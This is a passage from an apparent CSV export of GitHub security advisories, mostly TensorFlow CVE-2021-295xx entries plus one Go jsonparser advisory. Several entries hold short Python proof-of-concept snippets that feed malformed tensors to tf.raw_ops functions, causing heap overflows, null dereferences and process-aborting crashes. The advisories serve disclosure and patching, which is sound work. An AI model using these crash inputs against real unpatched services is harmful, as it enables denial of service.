ksize = [1, 1, 1, 1, 1]
strides = [1, 1, 1, 1, 1]
padding = ""SAME""

tf.raw_ops.MaxPool3DGradGrad(
    orig_input=orig_input, orig_output=orig_output, grad=grad, ksize=ksize,
    strides=strides, padding=padding)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/72fe792967e7fd25234342068806707bbc116618/tensorflow/core/kernels/pooling_ops_3d.cc#L679-L703) fails to validate that the 3 tensor inputs are not empty. If any of them is empty, then accessing the elements in the tensor results in dereferencing a null pointer.

### Patches
We have patched the issue in GitHub commit [a3d9f9be9ac2296615644061b40cefcee341dcc4](https://github.com/tensorflow/tensorflow/commit/a3d9f9be9ac2296615644061b40cefcee341dcc4).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
267,20741,tensorflow,GHSA-6qgm-fv6v-rfpv,CVE-2021-29575,https://github.com/advisories/GHSA-6qgm-fv6v-rfpv,low,2021-05-21 14:26:13 UTC,Overflow/denial of service in `tf.raw_ops.ReverseSequence`,"### Impact
The implementation of `tf.raw_ops.ReverseSequence` allows for stack overflow and/or `CHECK`-fail based denial of service.

```python
import tensorflow as tf

input = tf.zeros([1, 1, 1], dtype=tf.int32)
seq_lengths = tf.constant([0], shape=[1], dtype=tf.int32)

tf.raw_ops.ReverseSequence(
    input=input, seq_lengths=seq_lengths, seq_dim=-2, batch_dim=0)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/5b3b071975e01f0d250c928b2a8f901cd53b90a7/tensorflow/core/kernels/reverse_sequence_op.cc#L114-L118) fails to validate that `seq_dim` and `batch_dim` arguments are valid.
  
Negative values for `seq_dim` can result in stack overflow or `CHECK`-failure, depending on the version of Eigen code used to implement the operation. Similar behavior can be exhibited by invalid values of `batch_dim`.
  
### Patches
We have patched the issue in GitHub commit [ecf768cbe50cedc0a45ce1ee223146a3d3d26d23](https://github.com/tensorflow/tensorflow/commit/ecf768cbe50cedc0a45ce1ee223146a3d3d26d23).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution 
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
268,24236,jsonparser,GHSA-rmh2-65xw-9m6q,CVE-2020-10675,https://github.com/advisories/GHSA-rmh2-65xw-9m6q,moderate,2021-05-18 18:26:25 UTC,Infinite Loop in jsonparser,The Library API in buger jsonparser through 2019-12-04 allows attackers to cause a denial of service (infinite loop) via a Delete call.,go
269,20741,tensorflow,GHSA-7cqx-92hp-x6wh,CVE-2021-29576,https://github.com/advisories/GHSA-7cqx-92hp-x6wh,low,2021-05-21 14:26:16 UTC,Heap buffer overflow in `MaxPool3DGradGrad`,"### Impact
The implementation of `tf.raw_ops.MaxPool3DGradGrad` is vulnerable to a heap buffer overflow: 

```python
import tensorflow as tf

values = [0.01] * 11
orig_input = tf.constant(values, shape=[11, 1, 1, 1, 1], dtype=tf.float32)
orig_output = tf.constant([0.01], shape=[1, 1, 1, 1, 1], dtype=tf.float32)
grad = tf.constant([0.01], shape=[1, 1, 1, 1, 1], dtype=tf.float32)
ksize = [1, 1, 1, 1, 1]
strides = [1, 1, 1, 1, 1]
padding = ""SAME""

tf.raw_ops.MaxPool3DGradGrad(
    orig_input=orig_input, orig_output=orig_output, grad=grad, ksize=ksize,
    strides=strides, padding=padding)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/596c05a159b6fbb9e39ca10b3f7753b7244fa1e9/tensorflow/core/kernels/pooling_ops_3d.cc#L694-L696) does not check that the initialization of `Pool3dParameters` completes successfully:

```cc
Pool3dParameters params{context,  ksize_,       stride_,
                        padding_, data_format_, tensor_in.shape()};
```

Since [the constructor](https://github.com/tensorflow/tensorflow/blob/596c05a159b6fbb9e39ca10b3f7753b7244fa1e9/tensorflow/core/kernels/pooling_ops_3d.cc#L48-L88) uses `OP_REQUIRES` to validate conditions, the first assertion that fails interrupts the initialization of `params`, making it contain invalid data. In turn, this might cause a heap buffer overflow, depending on default initialized values.

### Patches
We have patched the issue in GitHub commit [63c6a29d0f2d692b247f7bf81f8732d6442fad09](https://github.com/tensorflow/tensorflow/commit/63c6a29d0f2d692b247f7bf81f8732d6442fad09).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
270,20741,tensorflow,GHSA-v6r6-84gr-92rm,CVE-2021-29577,https://github.com/advisories/GHSA-v6r6-84gr-92rm,low,2021-05-21 14:26:18 UTC,Heap buffer overflow in `AvgPool3DGrad`,"### Impact
The implementation of `tf.raw_ops.AvgPool3DGrad` is vulnerable to a heap buffer overflow:

```python
import tensorflow as tf

orig_input_shape = tf.constant([10, 6, 3, 7, 7], shape=[5], dtype=tf.int32)
grad = tf.constant([0.01, 0, 0], shape=[3, 1, 1, 1, 1], dtype=tf.float32)
ksize = [1, 1, 1, 1, 1]
strides = [1, 1, 1, 1, 1]
padding = ""SAME""

tf.raw_ops.AvgPool3DGrad(
  orig_input_shape=orig_input_shape, grad=grad, ksize=ksize, strides=strides,
  padding=padding)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/d80ffba9702dc19d1fac74fc4b766b3fa1ee976b/tensorflow/core/kernels/pooling_ops_3d.cc#L376-L450) assumes that the `orig_input_shape` and `grad` tensors have similar first and last dimensions but does not check that this assumption is validated.

### Patches
We have patched the issue in GitHub commit [6fc9141f42f6a72180ecd24021c3e6b36165fe0d](https://github.com/tensorflow/tensorflow/commit/6fc9141f42f6a72180ecd24021c3e6b36165fe0d).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
271,20741,tensorflow,GHSA-6f89-8j54-29xf,CVE-2021-29578,https://github.com/advisories/GHSA-6f89-8j54-29xf,low,2021-05-21 14:26:21 UTC,Heap buffer overflow in `FractionalAvgPoolGrad`,"### Impact
The implementation of `tf.raw_ops.FractionalAvgPoolGrad` is vulnerable to a heap buffer overflow:
  
```python
import tensorflow as tf

orig_input_tensor_shape = tf.constant([1, 3, 2, 3], shape=[4], dtype=tf.int64)
out_backprop = tf.constant([2], shape=[1, 1, 1, 1], dtype=tf.int64)
row_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)
col_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)


tf.raw_ops.FractionalAvgPoolGrad(
  orig_input_tensor_shape=orig_input_tensor_shape, out_backprop=out_backprop,
  row_pooling_sequence=row_pooling_sequence,
  col_pooling_sequence=col_pooling_sequence, overlapping=False)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/dcba796a28364d6d7f003f6fe733d82726dda713/tensorflow/core/kernels/fractional_avg_pool_op.cc#L216) fails to validate that the pooling sequence arguments have enough elements as required by the `out_backprop` tensor shape.

### Patches
We have patched the issue in GitHub commit [12c727cee857fa19be717f336943d95fca4ffe4f](https://github.com/tensorflow/tensorflow/commit/12c727cee857fa19be717f336943d95fca4ffe4f).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
272,20741,tensorflow,GHSA-79fv-9865-4qcv,CVE-2021-29579,https://github.com/advisories/GHSA-79fv-9865-4qcv,low,2021-05-21 14:26:23 UTC,Heap buffer overflow in `MaxPoolGrad`,"### Impact
The implementation of `tf.raw_ops.MaxPoolGrad` is vulnerable to a heap buffer overflow:
  
```python
import tensorflow as tf

orig_input = tf.constant([0.0], shape=[1, 1, 1, 1], dtype=tf.float32)
orig_output = tf.constant([0.0], shape=[1, 1, 1, 1], dtype=tf.float32)
grad = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)
ksize = [1, 1, 1, 1] 
strides = [1, 1, 1, 1]
padding = ""SAME""

tf.raw_ops.MaxPoolGrad(
  orig_input=orig_input, orig_output=orig_output, grad=grad, ksize=ksize,
  strides=strides, padding=padding, explicit_paddings=[])
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/ab1e644b48c82cb71493f4362b4dd38f4577a1cf/tensorflow/core/kernels/maxpooling_op.cc#L194-L203) fails to validate that indices used to access elements of input/output arrays are valid:

```cc
for (int index = out_start; index < out_end; ++index) {
  int input_backprop_index = out_arg_max_flat(index);
  FastBoundsCheck(input_backprop_index - in_start, in_end - in_start);
  input_backprop_flat(input_backprop_index) += out_backprop_flat(index);
}
```

Whereas accesses to `input_backprop_flat` are guarded by `FastBoundsCheck`, the indexing in `out_backprop_flat` can result in OOB access.

### Patches
We have patched the issue in GitHub commit [a74768f8e4efbda4def9f16ee7e13cf3922ac5f7](https://github.com/tensorflow/tensorflow/commit/a74768f8e4efbda4def9f16ee7e13cf3922ac5f7).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
273,20741,tensorflow,GHSA-x8h6-xgqx-jqgp,CVE-2021-29580,https://github.com/advisories/GHSA-x8h6-xgqx-jqgp,low,2021-05-21 14:26:26 UTC,Undefined behavior and `CHECK`-fail in `FractionalMaxPoolGrad`,"### Impact
The implementation of `tf.raw_ops.FractionalMaxPoolGrad` triggers an undefined behavior if one of the input tensors is empty:

```python
import tensorflow as tf

orig_input = tf.constant([2, 3], shape=[1, 1, 1, 2], dtype=tf.int64)
orig_output = tf.constant([], dtype=tf.int64) 
out_backprop = tf.zeros([2, 3, 6, 6], dtype=tf.int64)
row_pooling_sequence = tf.constant([0], shape=[1], dtype=tf.int64)
col_pooling_sequence = tf.constant([0], shape=[1], dtype=tf.int64)

tf.raw_ops.FractionalMaxPoolGrad(
  orig_input=orig_input, orig_output=orig_output, out_backprop=out_backprop,
  row_pooling_sequence=row_pooling_sequence,
  col_pooling_sequence=col_pooling_sequence, overlapping=False)
```

The code is also vulnerable to a denial of service attack as a `CHECK` condition becomes false and aborts the process

```python
import tensorflow as tf

orig_input = tf.constant([1], shape=[1], dtype=tf.int64)
orig_output = tf.constant([1], shape=[1], dtype=tf.int64)
out_backprop = tf.constant([1, 1], shape=[2, 1, 1, 1], dtype=tf.int64)
row_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64) 
col_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)

tf.raw_ops.FractionalMaxPoolGrad(
  orig_input=orig_input, orig_output=orig_output, out_backprop=out_backprop,
  row_pooling_sequence=row_pooling_sequence,
  col_pooling_sequence=col_pooling_sequence, overlapping=False)
``` 

The [implementation](https://github.com/tensorflow/tensorflow/blob/169054888d50ce488dfde9ca55d91d6325efbd5b/tensorflow/core/kernels/fractional_max_pool_op.cc#L215) fails to validate that input and output tensors are not empty and are of the same rank. Each of these unchecked assumptions is responsible for the above issues.

### Patches
We have patched the issue in GitHub commit [32fdcbff9d06d010d908fcc4bd4b36eb3ce15925](https://github.com/tensorflow/tensorflow/commit/32fdcbff9d06d010d908fcc4bd4b36eb3ce15925).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
274,20741,tensorflow,GHSA-vq2r-5xvm-3hc3,CVE-2021-29581,https://github.com/advisories/GHSA-vq2r-5xvm-3hc3,low,2021-05-21 14:26:30 UTC,Segfault in `CTCBeamSearchDecoder`,"### Impact
Due to lack of validation in `tf.raw_ops.CTCBeamSearchDecoder`, an attacker can trigger denial of service via segmentation faults:

```python
import tensorflow as tf

inputs = tf.constant([], shape=[18, 8, 0], dtype=tf.float32)
sequence_length = tf.constant([11, -43, -92, 11, -89, -83, -35, -100],
shape=[8], dtype=tf.int32)
beam_width = 10
top_paths = 3
merge_repeated = True

tf.raw_ops.CTCBeamSearchDecoder(
  inputs=inputs, sequence_length=sequence_length, beam_width=beam_width,
  top_paths=top_paths, merge_repeated=merge_repeated)
``` 

The [implementation](https://github.com/tensorflow/tensorflow/blob/a74768f8e4efbda4def9f16ee7e13cf3922ac5f7/tensorflow/core/kernels/ctc_decoder_ops.cc#L68-L79) fails to detect cases when the input tensor is empty and proceeds to read data from a null buffer.
  
### Patches
We have patched the issue in GitHub commit [b1b323042264740c398140da32e93fb9c2c9f33e](https://github.com/tensorflow/tensorflow/commit/b1b323042264740c398140da32e93fb9c2c9f33e).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
275,20741,tensorflow,GHSA-c45w-2wxr-pp53,CVE-2021-29582,https://github.com/advisories/GHSA-c45w-2wxr-pp53,low,2021-05-21 14:26:32 UTC,Heap OOB read in `tf.raw_ops.Dequantize`,"### Impact
Due to lack of validation in `tf.raw_ops.Dequantize`, an attacker can trigger a read from outside of bounds of heap allocated data:

```python
import tensorflow as tf

input_tensor=tf.constant(
  [75, 75, 75, 75, -6, -9, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10,\
  -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10,\
  -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10, -10,\
  -10, -10, -10, -10], shape=[5, 10], dtype=tf.int32)
input_tensor=tf.cast(input_tensor, dtype=tf.quint8)
min_range = tf.constant([-10], shape=[1], dtype=tf.float32)
max_range = tf.constant([24, 758, 758, 758, 758], shape=[5], dtype=tf.float32)
  
tf.raw_ops.Dequantize( 
  input=input_tensor, min_range=min_range, max_range=max_range, mode='SCALED',
  narrow_range=True, axis=0, dtype=tf.dtypes.float32)
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/26003593aa94b1742f34dc22ce88a1e17776a67d/tensorflow/core/kernels/dequantize_op.cc#L106-L131) accesses the `min_range` and `max_range` tensors in parallel but fails to check that they have the same shape:

```cc
if (num_slices == 1) {
  const float min_range = input_min_tensor.flat<float>()(0);
  const float max_range = input_max_tensor.flat<float>()(0);
  DequantizeTensor(ctx, input, min_range, max_range, &float_output);
} else {
  ...
  auto min_ranges = input_min_tensor.vec<float>();
  auto max_ranges = input_max_tensor.vec<float>();
  for (int i = 0; i < num_slices; ++i) {
    DequantizeSlice(ctx->eigen_device<Device>(), ctx,
                    input_tensor.template chip<1>(i), min_ranges(i),
                    max_ranges(i), output_tensor.template chip<1>(i));
    ...
  }
}
```

### Patches
We have patched the issue in GitHub commit [5899741d0421391ca878da47907b1452f06aaf1b](https://github.com/tensorflow/tensorflow/commit/5899741d0421391ca878da47907b1452f06aaf1b).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
276,20741,tensorflow,GHSA-9xh4-23q4-v6wr,CVE-2021-29583,https://github.com/advisories/GHSA-9xh4-23q4-v6wr,low,2021-05-21 14:26:35 UTC,Heap buffer overflow and undefined behavior in `FusedBatchNorm`,"### Impact
The implementation of `tf.raw_ops.FusedBatchNorm` is vulnerable to a heap buffer overflow:
      
```python
import tensorflow as tf

x = tf.zeros([10, 10, 10, 6], dtype=tf.float32)
scale = tf.constant([0.0], shape=[1], dtype=tf.float32)
offset = tf.constant([0.0], shape=[1], dtype=tf.float32)
mean = tf.constant([0.0], shape=[1], dtype=tf.float32)
variance = tf.constant([0.0], shape=[1], dtype=tf.float32)
epsilon = 0.0
exponential_avg_factor = 0.0
data_format = ""NHWC""
is_training = False
    
tf.raw_ops.FusedBatchNorm(
  x=x, scale=scale, offset=offset, mean=mean, variance=variance,
  epsilon=epsilon, exponential_avg_factor=exponential_avg_factor,
  data_format=data_format, is_training=is_training)
```
  
If the tensors are empty, the same implementation can trigger undefined behavior by dereferencing null pointers:

```python 
import tensorflow as tf
import numpy as np

x = tf.zeros([10, 10, 10, 1], dtype=tf.float32)
scale = tf.constant([], shape=[0], dtype=tf.float32)
offset = tf.constant([], shape=[0], dtype=tf.float32)
mean = tf.constant([], shape=[0], dtype=tf.float32)
variance = tf.constant([], shape=[0], dtype=tf.float32)
epsilon = 0.0
exponential_avg_factor = 0.0
data_format = ""NHWC""
is_training = False

tf.raw_ops.FusedBatchNorm(
  x=x, scale=scale, offset=offset, mean=mean, variance=variance, 
  epsilon=epsilon, exponential_avg_factor=exponential_avg_factor,
  data_format=data_format, is_training=is_training)
``` 

The  [implementation](https://github.com/tensorflow/tensorflow/blob/57d86e0db5d1365f19adcce848dfc1bf89fdd4c7/tensorflow/core/kernels/fused_batch_norm_op.cc) fails to validate that `scale`, `offset`, `mean` and `variance` (the last two only when required) all have the same number of elements as the number of channels of `x`. This results in heap out of bounds reads when the buffers backing these tensors are indexed past their boundary.

If the tensors are empty, the validation mentioned in the above paragraph would also trigger and prevent the undefined behavior.

### Patches
We have patched the issue in GitHub commit [6972f9dfe325636b3db4e0bc517ee22a159365c0](https://github.com/tensorflow/tensorflow/commit/6972f9dfe325636b3db4e0bc517ee22a159365c0).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
277,20741,tensorflow,GHSA-xvjm-fvxx-q3hv,CVE-2021-29584,https://github.com/advisories/GHSA-xvjm-fvxx-q3hv,low,2021-05-21 14:26:38 UTC,CHECK-fail due to integer overflow,"### Impact
An attacker can trigger a denial of service via a `CHECK`-fail in  caused by an integer overflow in constructing a new tensor shape:

```python
import tensorflow as tf

input_layer = 2**60-1
sparse_data = tf.raw_ops.SparseSplit(
    split_dim=1, 
    indices=[(0, 0), (0, 1), (0, 2), 
    (4, 3), (5, 0), (5, 1)],
    values=[1.0, 1.0, 1.0, 1.0, 1.0, 1.0],
    shape=(input_layer, input_layer),
    num_split=2,
    name=None
    )
```
  
This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/0908c2f2397c099338b901b067f6495a5b96760b/tensorflow/core/kernels/sparse_split_op.cc#L66-L70) builds a dense shape without checking that the dimensions would not result in overflow:

```cc
sparse::SparseTensor sparse_tensor;
OP_REQUIRES_OK(context,
               sparse::SparseTensor::Create(
                 input_indices, input_values,
                 TensorShape(input_shape.vec<int64>()), &sparse_tensor));
```

The [`TensorShape` constructor](https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/framework/tensor_shape.cc#L183-L188) uses a `CHECK` operation which triggers when [`InitDims`](https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/framework/tensor_shape.cc#L212-L296) returns a non-OK status.
                    
```cc               
template <class Shape>
TensorShapeBase<Shape>::TensorShapeBase(gtl::ArraySlice<int64> dim_sizes) {
  set_tag(REP16);
  set_data_type(DT_INVALID);
  TF_CHECK_OK(InitDims(dim_sizes));
}
```

In our scenario, this occurs when adding a dimension from the argument results in overflow:

```cc
template <class Shape>
Status TensorShapeBase<Shape>::InitDims(gtl::ArraySlice<int64> dim_sizes) {
  ...
  Status status = Status::OK();
  for (int64 s : dim_sizes) {
    status.Update(AddDimWithStatus(internal::SubtleMustCopy(s)));
    if (!status.ok()) {
      return status;
    }
  }
}

template <class Shape>
Status TensorShapeBase<Shape>::AddDimWithStatus(int64 size) {
  ...
  int64 new_num_elements;
  if (kIsPartial && (num_elements() < 0 || size < 0)) {
    new_num_elements = -1;
  } else {
    new_num_elements = MultiplyWithoutOverflow(num_elements(), size);
    if (TF_PREDICT_FALSE(new_num_elements < 0)) {
        return errors::Internal(""Encountered overflow when multiplying "",
                                num_elements(), "" with "", size,
                                "", result: "", new_num_elements);
      }
  }
  ...
}
```

This is a legacy implementation of the constructor and operations should use `BuildTensorShapeBase` or `AddDimWithStatus` to prevent `CHECK`-failures in the presence of overflows.

### Patches
We have patched the issue in GitHub commit [4c0ee937c0f61c4fc5f5d32d9bb4c67428012a60](https://github.com/tensorflow/tensorflow/commit/4c0ee937c0f61c4fc5f5d32d9bb4c67428012a60).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by researchers from University of Virginia and University of California, Santa Barbara.",pip
278,20741,tensorflow,GHSA-mv78-g7wq-mhp4,CVE-2021-29585,https://github.com/advisories/GHSA-mv78-g7wq-mhp4,low,2021-05-21 14:26:41 UTC,Division by zero in padding computation in TFLite,"### Impact
The TFLite computation for size of output after padding, [`ComputeOutSize`](https://github.com/tensorflow/tensorflow/blob/0c9692ae7b1671c983569e5d3de5565843d500cf/tensorflow/lite/kernels/padding.h#L43-L55), does not check that the `stride` argument is not 0 before doing the division.

```cc
inline int ComputeOutSize(TfLitePadding padding, int image_size,
                          int filter_size, int stride, int dilation_rate = 1) {
  int effective_filter_size = (filter_size - 1) * dilation_rate + 1;
  switch (padding) {
    case kTfLitePaddingSame:
      return (image_size + stride - 1) / stride;
    case kTfLitePaddingValid:
      return (image_size + stride - effective_filter_size) / stride;
    default:
      return 0;
  }
}
```
  
Users can craft special models such that `ComputeOutSize` is called with `stride` set to 0.

### Patches
We have patched the issue in GitHub commit [49847ae69a4e1a97ae7f2db5e217c77721e37948](https://github.com/tensorflow/tensorflow/commit/49847ae69a4e1a97ae7f2db5e217c77721e37948).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
279,20741,tensorflow,GHSA-26j7-6w8w-7922,CVE-2021-29586,https://github.com/advisories/GHSA-26j7-6w8w-7922,low,2021-05-21 14:26:43 UTC,Division by zero in optimized pooling implementations in TFLite,"### Impact
Optimized pooling implementations in TFLite fail to check that the stride arguments are not 0 before calling [`ComputePaddingHeightWidth`](https://github.com/tensorflow/tensorflow/blob/3f24ccd932546416ec906a02ddd183b48a1d2c83/tensorflow/lite/kernels/pooling.cc#L90).

Since users can craft special models which will have `params->stride_{height,width}` be zero, this will result in a division by zero.
                          
### Patches
We have patched the issue in GitHub commit [5f7975d09eac0f10ed8a17dbb6f5964977725adc](https://github.com/tensorflow/tensorflow/commit/5f7975d09eac0f10ed8a17dbb6f5964977725adc).
      
The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.
      
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
280,20741,tensorflow,GHSA-j7rm-8ww4-xx2g,CVE-2021-29587,https://github.com/advisories/GHSA-j7rm-8ww4-xx2g,low,2021-05-21 14:26:45 UTC,Division by zero in TFLite's implementation of `SpaceToDepth`,"### Impact
The `Prepare` step of the `SpaceToDepth` TFLite operator [does not check for 0 before division](https://github.com/tensorflow/tensorflow/blob/5f7975d09eac0f10ed8a17dbb6f5964977725adc/tensorflow/lite/kernels/space_to_depth.cc#L63-L67).

```cc 
const int block_size = params->block_size;
const int input_height = input->dims->data[1];
const int input_width = input->dims->data[2];
int output_height = input_height / block_size;
int output_width = input_width / block_size;
```   

An attacker can craft a model such that `params->block_size` would be zero.

### Patches
We have patched the issue in GitHub commit [0d45ea1ca641b21b73bcf9c00e0179cda284e7e7](https://github.com/tensorflow/tensorflow/commit/0d45ea1ca641b21b73bcf9c00e0179cda284e7e7).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
281,20741,tensorflow,GHSA-vfr4-x8j2-3rf9,CVE-2021-29588,https://github.com/advisories/GHSA-vfr4-x8j2-3rf9,low,2021-05-21 14:26:48 UTC,Division by zero in TFLite's implementation of `TransposeConv`,"### Impact
The optimized implementation of the `TransposeConv` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/0d45ea1ca641b21b73bcf9c00e0179cda284e7e7/tensorflow/lite/kernels/internal/optimized/optimized_ops.h#L5221-L5222):

```cc 
int height_col = (height + pad_t + pad_b - filter_h) / stride_h + 1;
int width_col = (width + pad_l + pad_r - filter_w) / stride_w + 1;
```

An attacker can craft a model such that `stride_{h,w}` values are 0. Code calling this function must validate these arguments.

### Patches
We have patched the issue in GitHub commit [801c1c6be5324219689c98e1bd3e0ca365ee834d](https://github.com/tensorflow/tensorflow/commit/801c1c6be5324219689c98e1bd3e0ca365ee834d).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
282,20741,tensorflow,GHSA-3w67-q784-6w7c,CVE-2021-29589,https://github.com/advisories/GHSA-3w67-q784-6w7c,low,2021-05-21 14:26:51 UTC,Division by zero in TFLite's implementation of `GatherNd`,"### Impact
The reference implementation of the `GatherNd` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/0d45ea1ca641b21b73bcf9c00e0179cda284e7e7/tensorflow/lite/kernels/internal/reference/reference_ops.h#L966):

```cc 
ret.dims_to_count[i] = remain_flat_size / params_shape.Dims(i);
```

An attacker can craft a model such that `params` input would be an empty tensor. In turn, `params_shape.Dims(.)` would be zero, in at least one dimension.

### Patches
We have patched the issue in GitHub commit [8e45822aa0b9f5df4b4c64f221e64dc930a70a9d](https://github.com/tensorflow/tensorflow/commit/8e45822aa0b9f5df4b4c64f221e64dc930a70a9d).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. 

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
